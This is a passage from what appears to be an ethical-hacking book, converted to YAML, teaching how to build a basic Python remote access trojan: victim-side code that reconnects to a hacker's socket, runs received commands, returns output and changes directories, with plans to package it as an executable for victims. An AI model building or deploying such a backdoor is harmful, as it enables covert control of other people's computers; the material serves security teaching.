+    the command, we need to handle it properly so that we don''t break the program,
+    otherwise we will send the result back to the hacker:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if output.stderr.decode("utf-8") == "":'
+  prefs: []
+  type: TYPE_NORMAL
+- en: command_result = output.stdout
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'else:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: command_result = output.stderr
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The first condition checks that if there is no error during command execution,
+    we set the **command_result** variable to the output of the command, otherwise
+    we set **command_result** to the error. Note that by default, this is in the form
+    of bytes, so we don''t need to encode it to send it over the network:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: victim_socket.send(command_result)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Finally, we need to put all this command execution code in a **try-catch**
+    block for any exception handling and proper closure of the socket. The complete
+    program can be found here: [https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Let''s try running some commands on the victim''s machine and get back the
+    results. First, start the hacker program and then run the victim program. Enter
+    the commands in the hacker program and see the results contained therein:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 6.7 – Hacker executing a command on the victim'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_06_07.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 6.7 – Hacker executing a command on the victim
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here, you can see that the hacker sends an **ipconfig** command to the victim.
+    The victim program reads the command, executes it on the victim, and sends the
+    result back to the hacker. There are some minor issues with the program that we
+    will now discuss. Firstly, the victim program tries to connect just once with
+    the hacker, and if the hacker is not listening, the program will throw an error
+    and exit. This is not ideal since we want to connect to the victim whenever we
+    want. To do this, we will put the **connect()** method inside the loop so that
+    it can attempt to continuously make a connection with the hacker, and when the
+    hacker is online, the connection is immediately established. Take a look at the
+    code for the victim program here: [https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Let's now take a look at the changes made in this program. First, there is an
+    outer **while** loop. The purpose of this loop is to constantly try to establish
+    a connection with the hacker, and if an error occurs, it waits 5 seconds and then
+    tries to reconnect. Once the connection is established inside the loop, there
+    is another loop inside that makes sure that multiple commands can be sent by the
+    hacker to the victim. This **while** loop can be exited by the hacker by using
+    the **stop** command. Lastly, there is a keyboard interrupt exception if you want
+    to close the program. Press *Ctrl + C* to exit the program. This way, this program
+    won't run indefinitely.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'So now we have solved our first problem. Now we need to run the victim program
+    only once and it will keep on trying to connect with the hacker and, when the
+    hacker becomes available, it will connect. Our program has another small issue
+    as well. When the hacker program asks to enter a command, if we just press *Enter*,
+    it will cause problems because **Enter** is not a valid command. We also need
+    to handle that as well. To handle it, we can simply include a check to make sure
+    that the hacker does not enter an empty command. To do this, enter the following
+    commands:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if command == "":'
+  prefs: []
+  type: TYPE_NORMAL
+- en: continue
+  prefs: []
+  type: TYPE_NORMAL
+- en: We will put this check both in the hacker's as well as the victim's program.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Lastly, if you notice carefully, we can only send and receive data that is
+    less than 1,024 bytes, as defined in our receive function. Any data more than
+    this will be truncated. To see it in more detail, go to the Windows machine and
+    run any command whose result is more than 1,024 bytes. For instance, let''s take
+    a look at the **systeminfo** command. This command gives out the system information
+    and has a relatively large output:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 6.8 – systeminfo result'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_06_08.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 6.8 – systeminfo result
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Now, run the same command using your hacker program. Your output will be something
+    like this:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 6.9 – Truncated command result'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_06_09.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 6.9 – Truncated command result
+  prefs: []
+  type: TYPE_NORMAL
+- en: As you can see, we can only receive 1,024 bytes. This is not what we want. To
+    get the complete result, we need to make some modifications. On the victim program,
+    we will append a special **identifier** to the end of **command_result**. Using
+    this identifier, we will keep reading data in the hacker program until we reach
+    the identifier. This will act as a marker for the hacker program to know that
+    we have finished receiving all the data and can stop now.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The identifier string will be as follows:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: IDENTIFIER = "<END_OF_COMMAND_RESULT>"
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To add this identifier to **command_result**, we will first decode the result
+    from bytes to string, then append the identifier at the end, and finally again
+    convert the string into bytes, as shown:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: command_result = output.stdout
+  prefs: []
+  type: TYPE_NORMAL
+- en: command_result = command_result.decode("utf-8") + IDENTIFIER
+  prefs: []
+  type: TYPE_NORMAL
+- en: command_result = command_result.encode("utf-8")
+  prefs: []
+  type: TYPE_NORMAL
+- en: This time, instead of using the **send()** method, we will use the **sendall()**
+    method.
+  prefs: []
+  type: TYPE_NORMAL
+- en: On the hacker side, we will define the exact same identifier, so we can match
+    it. Now, instead of just receiving 1,024 bytes, we will add a **while** loop,
+    which will continuously receive data and store it in an array until we find the
+    identifier, and then we will remove the identifier and store the rest of the result.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Take a look at the following receiving code:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: full_command_result = b"
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'while True:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: chunk = hacker_socket.recv(1048)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if chunk.endswith(IDENTIFIER.encode()):'
+  prefs: []
+  type: TYPE_NORMAL
+- en: chunk = chunk[:-len(IDENTIFIER)]
+  prefs: []
+  type: TYPE_NORMAL
+- en: full_command_result += chunk
+  prefs: []
+  type: TYPE_NORMAL
+- en: break
+  prefs: []
+  type: TYPE_NORMAL
+- en: full_command_result +=chunk
+  prefs: []
+  type: TYPE_NORMAL
+- en: print(full_command_result.decode())
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We define a **full_command_result** variable that will hold the complete result.
+    Then we write a loop to read the buffer continuously until we reach the identifier.
+    Once the identifier is reached, we remove the identifier from the result, add
+    the remaining bytes to **full_command_result**, break the loop, and finally decode
+    it to print. The complete program for the hacker is shown here: [https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Similarly, the complete program for the victim is shown here: [https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now we have developed a program for a hacker that will execute commands on the
+    Windows victim machine and return a complete result to the hacker. This program
+    will work perfectly. However, the command for changing the directory will not
+    work properly on this since we are only working with the input and output of the
+    command result. Next, we will focus on making a program so that we can even navigate
+    directories as well. If you go to your Windows machine and open a Command Prompt,
+    you can use the **cd** command to navigate directories, and we will use a similar
+    approach here as well. So, when the user enters a change directory command, we
+    will move into a different directory in the victim's machine based on the command
+    given. In this section, we learned how we can run commands from the hacker program
+    and get the results back to the hacker. In the next section, we will learn how
+    we can navigate directories on the victim's computer by giving commands from the
+    hacker program.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Navigating directories
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'We will use a new module to change directory, called the **os** module. This
+    module is included in Python''s standard library, so you don''t need to install
+    it. Simply import the module in your program by writing the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: import os
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The first thing we need to do is to detect when the user enters the **cd**
+    command in the hacker program. This can be done by calling the **startswith()**
+    method on the string command. We will detect the command, send the command to
+    the victim program, and then skip the rest of the loop as follows:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if command.startswith("cd"):'
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.send(command.encode())
+  prefs: []
+  type: TYPE_NORMAL
+- en: continue
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Our first part of the program is now complete. Next, we need to receive this
+    command on the victim program, decode it, check the type of command, such as to
+    navigate the directory, and then find the path we want to move to. Let''s say
+    if we want to move back in the directory (one step up in the hierarchy), we enter
+    the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: cd ..
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**cd** is the name of the command and **..** is the path we want to move to.
+    So, on the victim program, we will first use the same check condition to see whether
+    **hacker_command** starts with **cd**. If it does, we will strip the command to
+    retrieve the path we want to move into. And finally, we will use the **os.chdir()**
+    method to navigate to the entered directory if it exists:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if hacker_command.startswith("cd"):'
+  prefs: []
+  type: TYPE_NORMAL
+- en: path2move = hacker_command.strip("cd ")
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if os.path.exists(path2move):'
+  prefs: []
+  type: TYPE_NORMAL
+- en: os.chdir(path2move)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'else:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: print("can't change directory to ", path2move)
+  prefs: []
+  type: TYPE_NORMAL
+- en: continue
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In Windows, you can see the current directory by giving the **pwd** (present
+    working directory) command in the shell. Let''s now run the hacker and victim
+    programs to see how we can navigate directories:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 6.10 – Changing directory'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_06_10.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 6.10 – Changing directory
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'As you can see in the preceding screenshot, we first navigate up in the folder
+    by using the **cd ..** command and move to the **user** folder. Then, we navigate
+    to the Desktop folder by means of the **cd Desktop** command. This way, we can
+    move up or down in the filesystem. The complete code for the hacker program is
+    given here: [https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Similarly, the complete code for the victim program is shown here: [https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: This preceding program will allow the hacker to execute commands and give basic
+    control of the victim's PC to the hacker. The hacker can use this as a template
+    to build more advanced functionalities into the program. You may be thinking that
+    whatever code we have written so far is in the form of a Python script, and in
+    order to deploy it and make a successful hacking attempt, the victim PC must have
+    Python installed and the script should be run manually, which does not seem like
+    a very good idea. Do not worry. In [*Chapter 8*](B14788_08_Final_JC_ePub.xhtml#_idTextAnchor160),
+    *Post Exploitation*, we will look at how we can bundle our Python code into a
+    single executable file with all the dependencies included inside it. This way,
+    we do not have to worry about whether the victim has Python installed. We will
+    create an **.exe** file from our script and deploy it to the victim. More about
+    this in the next chapter.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Summary
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In this chapter, we began by learning about socket programming and then learned
+    about how we can use sockets to create a network application. Our network application
+    included a hacker and victim program, which helped us to send Windows system commands
+    from a Linux-based hacker program, execute them on Windows, and get the results
+    back to the hacker. We also learned how to navigate the file stream as well. Our
+    basic version of the RAT is complete. Even though it is limited in its functionalities,
+    it gives us a solid understanding of the basics to create a far more advanced
+    malware program. In the next chapter, we will add some more features to our RAT,
+    such as transferring files. See you in the next chapter!
+  prefs: []
+  type: TYPE_NORMAL
